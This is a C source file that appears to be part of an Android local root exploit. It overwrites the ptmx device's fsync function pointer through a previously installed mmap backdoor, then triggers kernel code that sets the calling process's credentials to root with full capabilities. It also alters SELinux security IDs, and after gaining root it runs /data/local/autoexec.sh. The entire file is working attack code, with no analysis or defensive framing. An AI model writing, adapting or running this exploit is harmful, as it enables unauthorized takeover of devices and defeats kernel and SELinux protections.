#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cred.h"
#include "ptmx.h"
#include "backdoor_mmap.h"

#define THREAD_SIZE             8192

#define KERNEL_START            0xc0000000

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
  unsigned long flags;
  int preempt_count;
  unsigned long addr_limit;
  struct task_struct *task;

  /* ... */
};

struct kernel_cap_struct {
  unsigned long cap[2];
};

struct cred {
  unsigned long usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned long securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  unsigned char jit_keyring;
  void *thread_keyring;
  void *request_key_auth;
  void *tgcred;
  struct task_security_struct *security;

  /* ... */
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_security_struct {
  unsigned long osid;
  unsigned long sid;
  unsigned long exec_sid;
  unsigned long create_sid;
  unsigned long keycreate_sid;
  unsigned long sockcreate_sid;
};


struct task_struct_partial {
  struct list_head cpu_timers[3];
  struct cred *real_cred;
  struct cred *cred;
  struct cred *replacement_session_keyring;
  char comm[16];
};

static inline struct thread_info *
current_thread_info(void)
{
  register unsigned long sp asm ("sp");
  return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

static bool
is_cpu_timer_valid(struct list_head *cpu_timer)
{
  if (cpu_timer->next != cpu_timer->prev) {
    return false;
  }

  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return false;
  }

  return true;
}

static void
obtain_root_privilege_by_modify_task_cred(void)
{
  struct thread_info *info;
  struct cred *cred;
  struct task_security_struct *security;
  int i;

  info = current_thread_info();
  cred = NULL;

  for (i = 0; i < 0x400; i+= 4) {
    struct task_struct_partial *task = ((void *)info->task) + i;

    if (is_cpu_timer_valid(&task->cpu_timers[0])
     && is_cpu_timer_valid(&task->cpu_timers[1])
     && is_cpu_timer_valid(&task->cpu_timers[2])
     && task->real_cred == task->cred) {
      cred = task->cred;
      break;
    }
  }

  if (cred == NULL) {
    return;
  }

  cred->uid = 0;
  cred->gid = 0;
  cred->suid = 0;
  cred->sgid = 0;
  cred->euid = 0;
  cred->egid = 0;
  cred->fsuid = 0;
  cred->fsgid = 0;

  cred->cap_inheritable.cap[0] = 0xffffffff;
  cred->cap_inheritable.cap[1] = 0xffffffff;
  cred->cap_permitted.cap[0] = 0xffffffff;
  cred->cap_permitted.cap[1] = 0xffffffff;
  cred->cap_effective.cap[0] = 0xffffffff;
  cred->cap_effective.cap[1] = 0xffffffff;
  cred->cap_bset.cap[0] = 0xffffffff;
  cred->cap_bset.cap[1] = 0xffffffff;

  security = cred->security;
  if (security) {
    if (security->osid != 0
     && security->sid != 0
     && security->exec_sid == 0
     && security->create_sid == 0
     && security->keycreate_sid == 0
     && security->sockcreate_sid == 0) {
      security->osid = 1;
      security->sid = 1;
    }
  }
}

static void
obtain_root_privilege_by_commit_creds(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static void (*obtain_root_privilege_func)(void);

void
obtain_root_privilege(void)
{
  if (obtain_root_privilege_func) {
    obtain_root_privilege_func();
  }
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;
  int ret;
 
  obtain_root_privilege_func = obtain_root_privilege_by_commit_creds;

  fd = open(PTMX_DEVICE, O_WRONLY);

  ret = fsync(fd);

  if (getuid() != 0) {
    printf("commit_creds(): failed. Try to hack task->cred.\n");

    obtain_root_privilege_func = obtain_root_privilege_by_modify_task_cred;
    ret = fsync(fd);
  }

  close(fd);

  return (ret == 0);
}

static bool
run_exploit(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  int fd;
  bool ret;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
  *ptmx_fsync_address = obtain_root_privilege;

  ret = run_obtain_root_privilege(NULL);

  *ptmx_fsync_address = NULL;

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!setup_creds_functions()) {
    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/data/local/autoexec.sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
